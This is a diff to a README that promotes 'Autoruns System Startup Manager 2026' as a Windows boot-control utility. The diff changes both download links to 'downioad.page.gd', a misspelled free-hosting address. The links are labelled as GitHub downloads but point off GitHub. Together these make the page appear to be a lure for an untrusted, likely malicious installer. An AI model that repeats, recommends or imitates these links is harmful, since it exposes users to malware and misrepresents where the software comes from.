@@ -2,7 +2,7 @@
 
 Autoruns System Startup Manager 2026 is a comprehensive utility designed for Windows 10 and 11 users to gain complete control over their system's boot sequence. This advanced tool offers real-time monitoring and optimization capabilities, allowing you to streamline startup programs, drivers, and services for improved system performance. Whether you're an IT professional or a casual user, Autoruns provides an intuitive interface to manage and customize your boot experience effectively.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -93,6 +93,6 @@ Autoruns System Startup Manager is distributed under the MIT License. You are fr
 
 To access the latest version of Autoruns System Startup Manager and stay updated with new features, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Stay tuned for future releases and enhancements to optimize your Windows startup experience.
